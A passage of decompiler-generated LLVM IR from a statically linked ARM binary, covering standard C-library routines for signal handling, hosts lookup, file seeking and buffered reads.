  uselistorder i8 32, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 13, 12, 14, 11, 17, 16, 15, 18, 19 }
  uselistorder i32* @global_var_1feac.530, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_10d54, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10b4c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10cf8, { 1, 0 }
  uselistorder label %dec_label_pc_10ca8, { 1, 0 }
  uselistorder label %dec_label_pc_10cc0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10c7c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10c58, { 1, 0 }
  uselistorder label %bb57, { 1, 0 }
  uselistorder label %dec_label_pc_10c04, { 1, 0 }
  uselistorder label %dec_label_pc_10c00, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10be4, { 1, 0 }
  uselistorder label %dec_label_pc_10bd0, { 1, 0 }
  uselistorder label %dec_label_pc_10bb0, { 1, 0 }
  uselistorder label %dec_label_pc_10d1c.backedge, { 1, 0, 3, 5, 2, 4 }
  uselistorder label %dec_label_pc_10b6c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10d1c.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_10dec = call i32 @__read_etc_hosts_r()
  ret i32 %v0_10dec
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v3_10df8 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_10e00 = call i32 @__libc_getpid()
  store i32 %v3_10df8, i32* @r4, align 4
  %v0_10e0c = call i32 @kill()
  ret i32 %v0_10e0c

; uselistorder directives
  uselistorder i32 ()* @kill, { 2, 3, 1, 0 }
  uselistorder i32 ()* @__libc_getpid, { 0, 2, 1 }
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_10e10 = load i32, i32* @r4, align 4
  store i32 %v3_10e10, i32* %stack_var_-12, align 4
  %v6_10e10 = load i32, i32* @r5, align 4
  %v10_10e10 = ptrtoint i32* %stack_var_-12 to i32
  %v7_10e14 = icmp eq i32 %arg2, -1
  %v0_10e20.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v7_10e14, label %.thread, label %bb

.thread:                                          ; preds = %entry
  br label %dec_label_pc_10e38

bb:                                               ; preds = %entry
  %v2_10e1c = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v0_10e20.pre, i32* @r4, align 4
  %tmp19 = icmp slt i32 %v0_10e20.pre, 1
  br i1 %tmp19, label %dec_label_pc_10e38, label %dec_label_pc_10e28

dec_label_pc_10e28:                               ; preds = %bb
  %v7_10e2c = icmp sgt i32 %v0_10e20.pre, 64
  br i1 %v7_10e2c, label %dec_label_pc_10e38, label %bb20

bb20:                                             ; preds = %dec_label_pc_10e28
  store i32 %arg2, i32* %stack_var_-152, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v5_10e5c24 = add i32 %v10_10e10, 124
  store i32 %v5_10e5c24, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10e4c

dec_label_pc_10e38:                               ; preds = %.thread, %dec_label_pc_10e28, %bb
  %v0_10e38 = call i32 @__errno_location()
  store i32 %v0_10e38, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10e44 = inttoptr i32 %v0_10e38 to i32*
  store i32 22, i32* %v2_10e44, align 4
  %v0_10eb8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10eb8

dec_label_pc_10e4c:                               ; preds = %bb20, %dec_label_pc_10e4c
  %v5_10e5c25 = phi i32 [ %v5_10e5c24, %bb20 ], [ %v5_10e5c, %dec_label_pc_10e4c ]
  %v2_10e50 = add i32 %v5_10e5c25, -136
  %v3_10e50 = inttoptr i32 %v2_10e50 to i32*
  store i32 0, i32* %v3_10e50, align 4
  %v0_10e54.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_10e54 = add i32 %v0_10e54.pre, -1
  store i32 %v1_10e54, i32* %r0.global-to-local, align 4
  %v6_10e54 = icmp slt i32 %v1_10e54, 0
  %v4_10e5c = mul i32 %v1_10e54, 4
  %v5_10e5c = add i32 %v4_10e5c, %v10_10e10
  store i32 %v5_10e5c, i32* %r2.global-to-local, align 4
  br i1 %v6_10e54, label %dec_label_pc_10e64, label %dec_label_pc_10e4c

dec_label_pc_10e64:                               ; preds = %dec_label_pc_10e4c
  %v2_10e64 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_10e64, i32* @r5, align 4
  %v2_10e68 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_10e68, i32* %r0.global-to-local, align 4
  %v0_10e6c = load i32, i32* @r4, align 4
  %v2_10e70 = call i32 @__sigaddset(i32 %v2_10e68, i32 %v0_10e6c)
  store i32 %v2_10e70, i32* %r0.global-to-local, align 4
  %v1_10e74 = icmp slt i32 %v2_10e70, 0
  br i1 %v1_10e74, label %dec_label_pc_10eb4, label %dec_label_pc_10e7c

dec_label_pc_10e7c:                               ; preds = %dec_label_pc_10e64
  %v0_10e7c = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1feb4.723 to i32), i32* %r0.global-to-local, align 4
  %v2_10e84 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_1feb4.723 to i32), i32 %v0_10e7c)
  store i32 %v2_10e1c, i32* %r2.global-to-local, align 4
  %v0_10e9c = load i32, i32* @r4, align 4
  store i32 %v0_10e9c, i32* %r0.global-to-local, align 4
  %v4_10ea4 = call i32 @__libc_sigaction(i32 %v0_10e9c, i32* nonnull %stack_var_-152, i32 %v2_10e1c)
  store i32 %v4_10ea4, i32* %r0.global-to-local, align 4
  %v1_10ea8 = icmp slt i32 %v4_10ea4, 0
  br i1 %v1_10ea8, label %dec_label_pc_10eb4, label %bb23

bb23:                                             ; preds = %dec_label_pc_10e7c
  %v5_10eac = load i32, i32* %stack_var_-292, align 4
  store i32 %v5_10eac, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10eb8

dec_label_pc_10eb4:                               ; preds = %dec_label_pc_10e7c, %dec_label_pc_10e64
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10eb8

dec_label_pc_10eb8:                               ; preds = %bb23, %dec_label_pc_10e38, %dec_label_pc_10eb4
  %v0_10eb8 = phi i32 [ %v5_10eac, %bb23 ], [ %v0_10eb8.pre, %dec_label_pc_10e38 ], [ -1, %dec_label_pc_10eb4 ]
  store i32 %v0_10eb8, i32* %r0.global-to-local, align 4
  %v2_10ec0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10ec0, i32* @r4, align 4
  store i32 %v6_10e10, i32* @r5, align 4
  ret i32 %v0_10eb8

; uselistorder directives
  uselistorder i32 %v0_10eb8, { 1, 0 }
  uselistorder i32 %v5_10e5c, { 1, 0 }
  uselistorder i32 %v1_10e54, { 0, 2, 1 }
  uselistorder i32 %v2_10e1c, { 1, 0 }
  uselistorder i32 %v0_10e20.pre, { 1, 0, 2 }
  uselistorder i32 %v10_10e10, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32* %stack_var_-152, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 6, 10, 7, 9, 8, 11, 2, 0, 1 }
  uselistorder i32 (i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 (i32, i32)* @__sigaddset, { 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10eb8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10e4c, { 1, 0 }
  uselistorder label %dec_label_pc_10e38, { 1, 2, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10ec8 = add i32 %arg2, -1
  %v3_10ecc = udiv i32 %v1_10ec8, 32
  %v4_10ed0 = mul nuw nsw i32 %v3_10ecc, 4
  %v5_10ed0 = add i32 %v4_10ed0, %arg1
  %v6_10ed0 = inttoptr i32 %v5_10ed0 to i32*
  %v7_10ed0 = load i32, i32* %v6_10ed0, align 4
  %v1_10ed4 = urem i32 %v1_10ec8, 32
  %v7_10edc = shl i32 1, %v1_10ed4
  %v8_10edc = and i32 %v7_10ed0, %v7_10edc
  %v10_10edc = icmp ne i32 %v8_10edc, 0
  %. = zext i1 %v10_10edc to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_10ec8, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10eec = add i32 %arg2, -1
  %v3_10ef0 = udiv i32 %v1_10eec, 32
  %v4_10ef4 = mul nuw nsw i32 %v3_10ef0, 4
  %v5_10ef4 = add i32 %v4_10ef4, %arg1
  %v6_10ef4 = inttoptr i32 %v5_10ef4 to i32*
  %v7_10ef4 = load i32, i32* %v6_10ef4, align 4
  %v1_10ef8 = urem i32 %v1_10eec, 32
  %v7_10f00 = shl i32 1, %v1_10ef8
  %v8_10f00 = or i32 %v7_10ef4, %v7_10f00
  store i32 %v8_10f00, i32* %v6_10ef4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10eec, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10f10 = add i32 %arg2, -1
  %v3_10f14 = udiv i32 %v1_10f10, 32
  %v4_10f18 = mul nuw nsw i32 %v3_10f14, 4
  %v5_10f18 = add i32 %v4_10f18, %arg1
  %v6_10f18 = inttoptr i32 %v5_10f18 to i32*
  %v7_10f18 = load i32, i32* %v6_10f18, align 4
  %v1_10f1c = urem i32 %v1_10f10, 32
  %tmp = shl i32 -1, %v1_10f1c
  %v8_10f24 = add i32 %tmp, -1
  %v9_10f24 = and i32 %v7_10f18, %v8_10f24
  store i32 %v9_10f24, i32* %v6_10f18, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10f10, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10f34 = add i32 %arg1, 28
  %v2_10f34 = inttoptr i32 %v1_10f34 to i32*
  %v3_10f34 = load i32, i32* %v2_10f34, align 4
  %v1_10f3c = add i32 %arg1, 44
  %v2_10f3c = inttoptr i32 %v1_10f3c to i32*
  %v3_10f3c = load i32, i32* %v2_10f3c, align 4
  store i32 %v3_10f34, i32* @global_var_1ff34.725, align 4
  store i32 %v3_10f3c, i32* @global_var_1ff38.727, align 4
  ret i32 %arg1
}

define i32 @__GI_brk(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_10f60 = call i32 @brk(i32* %arg1)
  %v3_10f64 = icmp ult i32 %v2_10f60, %tmp
  store i32 %v2_10f60, i32* @global_var_1fe4c.660, align 4
  br i1 %v3_10f64, label %dec_label_pc_10f78, label %dec_label_pc_10f88

dec_label_pc_10f78:                               ; preds = %entry
  %v0_10f78 = call i32 @__errno_location()
  %v2_10f80 = inttoptr i32 %v0_10f78 to i32*
  store i32 12, i32* %v2_10f80, align 4
  br label %dec_label_pc_10f88

dec_label_pc_10f88:                               ; preds = %entry, %dec_label_pc_10f78
  %v0_10f88 = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_10f78 ]
  ret i32 %v0_10f88

; uselistorder directives
  uselistorder i32* @global_var_1fe4c.660, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10f88, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_10f98 = load i32, i32* @r0, align 4
  %v0_10f9c = call i32 @__errno_location()
  %v1_10fa0 = sub i32 0, %v0_10f98
  %v2_10fa4 = inttoptr i32 %v0_10f9c to i32*
  store i32 %v1_10fa0, i32* %v2_10fa4, align 4
  ret i32 -1
}

define i32 @__libc_poll(%pollfd* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10fb0 = load i32, i32* @r4, align 4
  store i32 %v3_10fb0, i32* %stack_var_-8, align 4
  %v5_10fb4 = call i32 @poll(%pollfd* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v5_10fb4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_10fb4, -4095
  br i1 %tmp, label %dec_label_pc_10fd4, label %dec_label_pc_10fc4

dec_label_pc_10fc4:                               ; preds = %entry
  %v0_10fc4 = call i32 @__errno_location()
  %v0_10fc8 = load i32, i32* %r4.global-to-local, align 4
  %v1_10fc8 = sub i32 0, %v0_10fc8
  %v2_10fcc = inttoptr i32 %v0_10fc4 to i32*
  store i32 %v1_10fc8, i32* %v2_10fcc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10fd4

dec_label_pc_10fd4:                               ; preds = %entry, %dec_label_pc_10fc4
  %v0_10fd4 = phi i32 [ %v5_10fb4, %entry ], [ -1, %dec_label_pc_10fc4 ]
  %v2_10fd8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10fd8, i32* @r4, align 4
  ret i32 %v0_10fd4

; uselistorder directives
  uselistorder i32 %v5_10fb4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10fd4, { 1, 0 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_10fdc = load i32, i32* @r2, align 4
  store i32 %v0_10fdc, i32* @r3, align 4
  %v0_10fe4 = call i32 @__GI_fseeko64()
  ret i32 %v0_10fe4
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_10fe8 = load i32, i32* @r4, align 4
  %v6_10fe8 = load i32, i32* @r5, align 4
  %v9_10fe8 = load i32, i32* @r6, align 4
  %v0_10fec = load i32, i32* @r3, align 4
  %v2_10ff0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v0_10fec, i32* @r6, align 4
  %v0_10ff8 = load i32, i32* @r0, align 4
  store i32 %v0_10ff8, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_10fec, 3
  br i1 %tmp, label %dec_label_pc_11014, label %dec_label_pc_11000

dec_label_pc_11000:                               ; preds = %entry
  %v0_11000 = call i32 @__errno_location()
  store i32 %v0_11000, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v2_1100c = inttoptr i32 %v0_11000 to i32*
  store i32 22, i32* %v2_1100c, align 4
  br label %.thread3

dec_label_pc_11014:                               ; preds = %entry
  %v1_11014 = add i32 %v0_10ff8, 52
  %v2_11014 = inttoptr i32 %v1_11014 to i32*
  %v3_11014 = load i32, i32* %v2_11014, align 4
  store i32 %v3_11014, i32* %r7.global-to-local, align 4
  %v2_11018 = icmp eq i32 %v3_11014, 0
  %v0_1101c = load i32, i32* @r1, align 4
  store i32 %v0_1101c, i32* %stack_var_-28, align 4
  br i1 %v2_11018, label %dec_label_pc_11028, label %dec_label_pc_11054

dec_label_pc_11028:                               ; preds = %dec_label_pc_11014
  %v1_11028 = add i32 %v0_10ff8, 56
  store i32 %v1_11028, i32* @r4, align 4
  store i32 58724, i32* %r3.global-to-local, align 4
  store i32 %v2_10ff0, i32* @r0, align 4
  store i32 %v1_11028, i32* %r2.global-to-local, align 4
  %v1_11040 = call i32 @__pthread_return_void()
  %v0_11044 = load i32, i32* @r4, align 4
  store i32 %v0_11044, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_e55c.404 to i32), i32* %r3.global-to-local, align 4
  store i32 69716, i32* @lr, align 4
  %v1_11050 = call i32 @__pthread_return_0()
  store i32 %v1_11050, i32* %r0.global-to-local, align 4
  %v0_11054.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11054

dec_label_pc_11054:                               ; preds = %dec_label_pc_11014, %dec_label_pc_11028
  %v0_11060 = phi i32 [ %v0_10ff8, %dec_label_pc_11014 ], [ %v0_11054.pre, %dec_label_pc_11028 ]
  %v1_11054 = inttoptr i32 %v0_11060 to i8*
  %v2_11054 = load i8, i8* %v1_11054, align 1
  %v3_11054 = zext i8 %v2_11054 to i32
  store i32 %v3_11054, i32* %r3.global-to-local, align 4
  %v1_11058 = and i32 %v3_11054, 64
  %v2_11058 = icmp eq i32 %v1_11058, 0
  br i1 %v2_11058, label %dec_label_pc_11070, label %dec_label_pc_11060

dec_label_pc_11060:                               ; preds = %dec_label_pc_11054
  store i32 %v0_11060, i32* @r0, align 4
  %v0_11064 = call i32 @__stdio_wcommit()
  store i32 %v0_11064, i32* %r0.global-to-local, align 4
  %v2_11068 = icmp eq i32 %v0_11064, 0
  br i1 %v2_11068, label %dec_label_pc_11070, label %dec_label_pc_110e0

dec_label_pc_11070:                               ; preds = %dec_label_pc_11060, %dec_label_pc_11054
  %v0_11070 = load i32, i32* @r6, align 4
  %v7_11070 = icmp eq i32 %v0_11070, 1
  br i1 %v7_11070, label %dec_label_pc_11078, label %dec_label_pc_11070.dec_label_pc_1108c_crit_edge

dec_label_pc_11070.dec_label_pc_1108c_crit_edge:  ; preds = %dec_label_pc_11070
  br label %dec_label_pc_1108c

dec_label_pc_11078:                               ; preds = %dec_label_pc_11070
  %v0_11078 = load i32, i32* @r5, align 4
  store i32 %v0_11078, i32* %r0.global-to-local, align 4
  %v2_1107c = ptrtoint i32* %stack_var_-28 to i32
  %v2_11080 = inttoptr i32 %v0_11078 to i8*
  %v3_11080 = call i32 @__stdio_adjust_position(i8* %v2_11080, i32 %v2_1107c)
  store i32 %v3_11080, i32* %r0.global-to-local, align 4
  %v1_11084 = icmp slt i32 %v3_11080, 0
  br i1 %v1_11084, label %dec_label_pc_110e0, label %dec_label_pc_11078.dec_label_pc_1108c_crit_edge

dec_label_pc_11078.dec_label_pc_1108c_crit_edge:  ; preds = %dec_label_pc_11078
  %v0_1108c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1108c

dec_label_pc_1108c:                               ; preds = %dec_label_pc_11070.dec_label_pc_1108c_crit_edge, %dec_label_pc_11078.dec_label_pc_1108c_crit_edge
  %v0_1108c = phi i32 [ %v0_11070, %dec_label_pc_11070.dec_label_pc_1108c_crit_edge ], [ %v0_1108c.pre, %dec_label_pc_11078.dec_label_pc_1108c_crit_edge ]
  store i32 %v0_1108c, i32* %r2.global-to-local, align 4
  %v0_11090 = load i32, i32* @r5, align 4
  store i32 %v0_11090, i32* %r0.global-to-local, align 4
  %v4_11098 = call i32 @__stdio_seek(i32 %v0_11090, i32* nonnull %stack_var_-28, i32 %v0_1108c)
  store i32 %v4_11098, i32* %r0.global-to-local, align 4
  %v1_1109c = icmp slt i32 %v4_11098, 0
  br i1 %v1_1109c, label %dec_label_pc_110e0, label %dec_label_pc_110a4

dec_label_pc_110a4:                               ; preds = %dec_label_pc_1108c
  %v0_110a4 = load i32, i32* @r5, align 4
  %v1_110a4 = inttoptr i32 %v0_110a4 to i32*
  %v2_110a4 = load i32, i32* %v1_110a4, align 4
  store i32 %v2_110a4, i32* %r3.global-to-local, align 4
  %v1_110a8 = add i32 %v0_110a4, 8
  %v2_110a8 = inttoptr i32 %v1_110a8 to i32*
  %v3_110a8 = load i32, i32* %v2_110a8, align 4
  store i32 %v3_110a8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_110b0 = and i32 %v2_110a4, -72
  store i32 %v1_110b0, i32* %r3.global-to-local, align 4
  %v3_110b4 = sdiv i32 %v2_110a4, 256
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_110bc = trunc i32 %v3_110b4 to i8
  %v3_110bc = add i32 %v0_110a4, 1
  %v4_110bc = inttoptr i32 %v3_110bc to i8*
  store i8 %v1_110bc, i8* %v4_110bc, align 1
  %v0_110c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_110c0 = load i32, i32* @r5, align 4
  %v2_110c0 = add i32 %v1_110c0, 28
  %v3_110c0 = inttoptr i32 %v2_110c0 to i32*
  store i32 %v0_110c0, i32* %v3_110c0, align 4
  %v0_110c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_110c4 = trunc i32 %v0_110c4 to i8
  %v2_110c4 = load i32, i32* @r5, align 4
  %v3_110c4 = add i32 %v2_110c4, 2
  %v4_110c4 = inttoptr i32 %v3_110c4 to i8*
  store i8 %v1_110c4, i8* %v4_110c4, align 1
  %v0_110c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_110c8 = trunc i32 %v0_110c8 to i8
  %v2_110c8 = load i32, i32* @r5, align 4
  %v3_110c8 = inttoptr i32 %v2_110c8 to i8*
  store i8 %v1_110c8, i8* %v3_110c8, align 1
  %v0_110cc = load i32, i32* %r2.global-to-local, align 4
  %v1_110cc = load i32, i32* @r5, align 4
  %v2_110cc = add i32 %v1_110cc, 16
  %v3_110cc = inttoptr i32 %v2_110cc to i32*
  store i32 %v0_110cc, i32* %v3_110cc, align 4
  %v0_110d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_110d0 = load i32, i32* @r5, align 4
  %v2_110d0 = add i32 %v1_110d0, 20
  %v3_110d0 = inttoptr i32 %v2_110d0 to i32*
  store i32 %v0_110d0, i32* %v3_110d0, align 4
  %v0_110d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_110d4 = load i32, i32* @r5, align 4
  %v2_110d4 = add i32 %v1_110d4, 24
  %v3_110d4 = inttoptr i32 %v2_110d4 to i32*
  store i32 %v0_110d4, i32* %v3_110d4, align 4
  %v0_110d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_110d8 = load i32, i32* @r5, align 4
  %v2_110d8 = add i32 %v1_110d8, 44
  %v3_110d8 = inttoptr i32 %v2_110d8 to i32*
  store i32 %v0_110d8, i32* %v3_110d8, align 4
  br label %dec_label_pc_110e4

dec_label_pc_110e0:                               ; preds = %dec_label_pc_11060, %dec_label_pc_1108c, %dec_label_pc_11078
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_110e4

dec_label_pc_110e4:                               ; preds = %dec_label_pc_110a4, %dec_label_pc_110e0
  %v0_110e4 = load i32, i32* %r7.global-to-local, align 4
  %v2_110e4 = icmp eq i32 %v0_110e4, 0
  br i1 %v2_110e4, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_110e4
  store i32 %v2_10ff0, i32* %r0.global-to-local, align 4
  store i32 58724, i32* %r3.global-to-local, align 4
  store i32 69884, i32* @lr, align 4
  call void @__pseudo_branch(i32 58724)
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_110e4, %dec_label_pc_11000, %bb
  %v0_110fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_110fc, i32* %r0.global-to-local, align 4
  store i32 %v3_10fe8, i32* @r4, align 4
  store i32 %v6_10fe8, i32* @r5, align 4
  store i32 %v9_10fe8, i32* @r6, align 4
  ret i32 %v0_110fc

; uselistorder directives
  uselistorder i32 %v0_1108c, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 9, 8, 11, 0, 10, 12 }
  uselistorder i32 ()* @__pthread_return_0, { 5, 23, 22, 21, 20, 19, 18, 17, 4, 42, 45, 44, 35, 3, 2, 1, 41, 40, 39, 38, 10, 0, 9, 8, 7, 16, 15, 14, 13, 12, 11, 6, 29, 28, 27, 31, 30, 37, 26, 36, 43, 25, 24, 34, 33, 32 }
  uselistorder i32 ptrtoint (i8* @global_var_e55c.404 to i32), { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__pthread_return_void, { 2, 3, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 0, 1, 44, 43, 48, 47, 46, 45, 40, 39, 5, 4, 28, 27, 26, 25, 24, 32, 31, 30, 29, 42, 23, 41, 22, 21, 20, 19, 38, 37, 36, 35, 34, 33 }
  uselistorder i32 58724, { 0, 5, 6, 7, 8, 1, 9, 10, 11, 2, 3, 4, 12 }
  uselistorder i32 52, { 7, 2, 5, 3, 1, 6, 4, 0 }
  uselistorder i32 22, { 1, 11, 2, 3, 4, 8, 5, 10, 12, 6, 13, 0, 9, 7 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_110e4, { 1, 0 }
  uselistorder label %dec_label_pc_110e0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1108c, { 1, 0 }
  uselistorder label %dec_label_pc_11054, { 1, 0 }
}

define i32 @__stdio_READ(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_11118 = load i32, i32* @r4, align 4
  store i32 %v3_11118, i32* %stack_var_-12, align 4
  %v3_1111c = load i8, i8* %arg1, align 1
  %v4_1111c = zext i8 %v3_1111c to i32
  store i32 %v4_1111c, i32* %r3.global-to-local, align 4
  %v1_11120 = and i32 %v4_1111c, 4
  store i32 %v1_11120, i32* %r5.global-to-local, align 4
  %v2_11120 = icmp eq i32 %v1_11120, 0
  store i1 %v2_11120, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v2_11120, label %bb8, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_11118, i32* @r4, align 4
  ret i32 0

bb8:                                              ; preds = %entry
  %v1_11130 = icmp slt i32 %arg2, 0
  %v2_11130 = icmp eq i32 %arg2, 0
  store i1 %v2_11130, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_11130, label %bb9, label %bb10

bb9:                                              ; preds = %bb8
  store i32 2147483647, i32* @r2, align 4
  br label %bb10

bb10:                                             ; preds = %bb8, %bb9
  %v1_11138 = add i32 %tmp, 4
  %v2_11138 = inttoptr i32 %v1_11138 to i32*
  %v3_11138 = load i32, i32* %v2_11138, align 4
  store i32 %v3_11138, i32* %r0.global-to-local, align 4
  %v1_1113c = call i32 @__libc_read(i32 %v3_11138)
  store i32 %v1_1113c, i32* %r0.global-to-local, align 4
  %v2_11140 = icmp eq i32 %v1_1113c, 0
  store i1 %v2_11140, i1* %cpsr_z.global-to-local, align 1
  %tmp11 = icmp slt i32 %v1_1113c, 1
  br i1 %tmp11, label %bb13, label %bb12

bb12:                                             ; preds = %bb10
  %v7_11144 = load i32, i32* %stack_var_-12, align 4
  store i32 %v7_11144, i32* @r4, align 4
  ret i32 %v1_1113c

bb13:                                             ; preds = %bb10
  %v0_11148 = load i32, i32* @r4, align 4
  %v1_11148 = inttoptr i32 %v0_11148 to i32*
  %v2_11148 = load i32, i32* %v1_11148, align 4
  %v1_1114c = or i32 %v2_11148, 8
  store i32 %v1_1114c, i32* %r1.global-to-local, align 4
  %v1_11150 = or i32 %v2_11148, 4
  store i32 %v1_11150, i32* %r3.global-to-local, align 4
  %v3_11154 = sdiv i32 %v2_11148, 256
  store i32 %v3_11154, i32* @ip, align 4
  br i1 %v2_11140, label %.thread, label %bb14

bb14:                                             ; preds = %bb13
  %v1_1115c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_1115c, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread:                                          ; preds = %bb13
  %v2_11160 = trunc i32 %v3_11154 to i8
  %v4_11160 = add i32 %v0_11148, 1
  %v5_11160 = inttoptr i32 %v4_11160 to i8*
  store i8 %v2_11160, i8* %v5_11160, align 1
  %v0_11164.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11164.pr, label %.thread1, label %.thread2

.thread1:                                         ; preds = %.thread
  %v1_11164 = load i32, i32* %r3.global-to-local, align 4
  %v2_11164 = trunc i32 %v1_11164 to i8
  %v3_11164 = load i32, i32* @r4, align 4
  %v4_11164 = inttoptr i32 %v3_11164 to i8*
  store i8 %v2_11164, i8* %v4_11164, align 1
  %v0_11168.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11168.pr.pr, label %.thread3, label %.thread2

.thread2:                                         ; preds = %bb14, %.thread, %.thread1
  %v1_11168 = load i32, i32* @ip, align 4
  %v2_11168 = trunc i32 %v1_11168 to i8
  %v3_11168 = load i32, i32* @r4, align 4
  %v4_11168 = add i32 %v3_11168, 1
